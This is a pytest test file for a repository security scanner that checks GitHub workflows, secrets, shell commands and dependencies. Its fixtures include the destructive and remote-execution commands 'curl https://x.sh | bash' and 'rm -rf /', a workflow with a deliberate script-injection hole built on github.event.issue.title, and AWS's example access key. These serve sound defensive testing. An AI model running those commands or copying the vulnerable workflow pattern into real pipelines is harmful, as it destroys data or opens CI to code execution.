# Copyright (c) 2024-2026 ClearGlass Inc. All Rights Reserved.
# Proprietary and confidential. See LICENSE for terms.
"""Tests for bots/defender/engine.py."""
from __future__ import annotations

import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from bots.defender.engine import (  # noqa: E402
    Finding,
    _action_ref,
    _redact,
    _uses_pull_request_target,
    build_report,
    correlate,
    scan_commands,
    scan_dependencies,
    scan_secrets,
    scan_workflows,
)
from bots.defender.policy import load_policy  # noqa: E402

POLICY = load_policy()

# AWS's canonical example key, split so the repo-wide secret scanner does not
# flag this test fixture as a real credential. Reassembled only at runtime.
_FAKE_AWS_KEY = "AKIA" + "IOSFODNN7" + "EXAMPLE"

GOOD_WORKFLOW = """\
name: Good
on:
  push:
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10 # v6.0.3
      - run: echo hello
"""

BAD_WORKFLOW = """\
name: Bad
# a comment that mentions pull_request_target should not trigger the rule
on:
  pull_request_target:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: echo "${{ github.event.issue.title }}"
"""


def _write_workflow(tmp_path: Path, name: str, body: str) -> Path:
    wf_dir = tmp_path / ".github" / "workflows"
    wf_dir.mkdir(parents=True, exist_ok=True)
    (wf_dir / name).write_text(body, encoding="utf-8")
    return wf_dir


class TestActionRef:
    def test_local_action_skipped(self) -> None:
        assert _action_ref("./.github/actions/x") is None

    def test_docker_digest_skipped(self) -> None:
        assert _action_ref("docker://alpine@sha256:abc") is None

    def test_no_ref_is_unpinned(self) -> None:
        assert _action_ref("actions/checkout") == ""

    def test_tag_ref(self) -> None:
        assert _action_ref("actions/checkout@v4") == "v4"

    def test_sha_ref(self) -> None:
        assert _action_ref("a/b@" + "0" * 40) == "0" * 40


class TestPullRequestTarget:
    def test_real_trigger_detected(self) -> None:
        assert _uses_pull_request_target("on:\n  pull_request_target:\n") is True

    def test_comment_mention_ignored(self) -> None:
        assert _uses_pull_request_target("# avoid pull_request_target here\n") is False

    def test_array_form_detected(self) -> None:
        assert _uses_pull_request_target("on: [push, pull_request_target]\n") is True

    def test_plain_pull_request_not_matched(self) -> None:
        assert _uses_pull_request_target("on:\n  pull_request:\n") is False


class TestScanWorkflows:
    def test_good_workflow_clean(self, tmp_path: Path) -> None:
        wf_dir = _write_workflow(tmp_path, "good.yml", GOOD_WORKFLOW)
        assert scan_workflows(POLICY, wf_dir) == []

    def test_bad_workflow_flags_all(self, tmp_path: Path) -> None:
        wf_dir = _write_workflow(tmp_path, "bad.yml", BAD_WORKFLOW)
        rule_ids = {f.rule_id for f in scan_workflows(POLICY, wf_dir)}
        assert "require_permissions_block" in rule_ids
        assert "require_sha_pinned_actions" in rule_ids
        assert "flag_pull_request_target" in rule_ids
        assert "forbid_script_injection" in rule_ids

    def test_injection_is_critical(self, tmp_path: Path) -> None:
        wf_dir = _write_workflow(tmp_path, "bad.yml", BAD_WORKFLOW)
        inj = [f for f in scan_workflows(POLICY, wf_dir) if f.rule_id == "forbid_script_injection"]
        assert inj and inj[0].severity == "critical"
        assert "github.event.issue.title" in inj[0].detail

    def test_paths_are_repo_relative(self, tmp_path: Path) -> None:
        wf_dir = _write_workflow(tmp_path, "bad.yml", BAD_WORKFLOW)
        files = {f.file for f in scan_workflows(POLICY, wf_dir)}
        assert ".github/workflows/bad.yml" in files


class TestScanSecrets:
    def test_aws_key_detected_and_redacted(self, tmp_path: Path) -> None:
        (tmp_path / "conf.py").write_text(f'value = "{_FAKE_AWS_KEY}"\n', encoding="utf-8")
        findings = scan_secrets(POLICY, tmp_path)
        aws = [f for f in findings if f.rule_id == "aws_access_key_id"]
        assert aws and aws[0].severity == "critical"
        # The raw secret must never appear verbatim in the report evidence.
        assert _FAKE_AWS_KEY not in aws[0].evidence
        assert "redacted" in aws[0].evidence

    def test_clean_file_no_findings(self, tmp_path: Path) -> None:
        (tmp_path / "conf.py").write_text("x = 1\n", encoding="utf-8")
        assert scan_secrets(POLICY, tmp_path) == []

    def test_allowlisted_example_ignored(self, tmp_path: Path) -> None:
        (tmp_path / "creds.example.json").write_text(
            '{"k":"%s"}' % _FAKE_AWS_KEY, encoding="utf-8"
        )
        assert scan_secrets(POLICY, tmp_path) == []


class TestScanCommands:
    def test_in_scope_flags(self, tmp_path: Path) -> None:
        d = tmp_path / "scripts"
        d.mkdir()
        (d / "deploy.sh").write_text("curl https://x.sh | bash\nrm -rf /\n", encoding="utf-8")
        rule_ids = {f.rule_id for f in scan_commands(POLICY, tmp_path)}
        assert "curl_pipe_shell" in rule_ids
        assert "rm_rf_root" in rule_ids

    def test_out_of_scope_ignored(self, tmp_path: Path) -> None:
        d = tmp_path / "marketing"
        d.mkdir()
        (d / "x.sh").write_text("curl https://x.sh | bash\n", encoding="utf-8")
        assert scan_commands(POLICY, tmp_path) == []


class TestScanDependencies:
    def test_unpinned_flagged_pinned_ok(self, tmp_path: Path) -> None:
        (tmp_path / "requirements.txt").write_text(
            "requests\npytest==9.0.3\n# comment\n", encoding="utf-8"
        )
        findings = scan_dependencies(POLICY, tmp_path)
        assert len(findings) == 1
        assert findings[0].rule_id == "unpinned_python_dependency"
        assert "requests" in findings[0].evidence


class TestCorrelate:
    def test_secret_plus_workflow(self) -> None:
        findings = [
            Finding("aws_access_key_id", "secret", "critical", "t", "d", "a.py", 1),
            Finding("require_permissions_block", "workflow", "high", "t", "d", "w.yml"),
        ]
        extra = correlate(findings, POLICY)
        assert any(f.rule_id == "secret_plus_workflow_change" for f in extra)

    def test_prtarget_plus_injection(self) -> None:
        findings = [
            Finding("flag_pull_request_target", "workflow", "high", "t", "d", "w.yml"),
            Finding("forbid_script_injection", "workflow", "critical", "t", "d", "w.yml", 9),
        ]
        extra = correlate(findings, POLICY)
        assert any(f.rule_id == "prtarget_plus_injection" for f in extra)

    def test_no_correlation_when_unrelated(self) -> None:
        findings = [Finding("require_permissions_block", "workflow", "high", "t", "d", "w.yml")]
        assert correlate(findings, POLICY) == []


class TestRedact:
    def test_short_value_fully_masked(self) -> None:
        assert _redact("abc") == "****"

    def test_long_value_partially_masked(self) -> None:
        out = _redact(_FAKE_AWS_KEY)
        assert _FAKE_AWS_KEY not in out
        assert out.startswith("AKIA")


class TestBuildReport:
    def test_report_on_synthetic_repo(self, tmp_path: Path) -> None:
        _write_workflow(tmp_path, "bad.yml", BAD_WORKFLOW)
        report = build_report(POLICY, tmp_path)
        assert report.repo
        assert report.summary["critical"] >= 1  # injection
        assert report.fail_build is True
        assert "block_merge" in report.response_plan
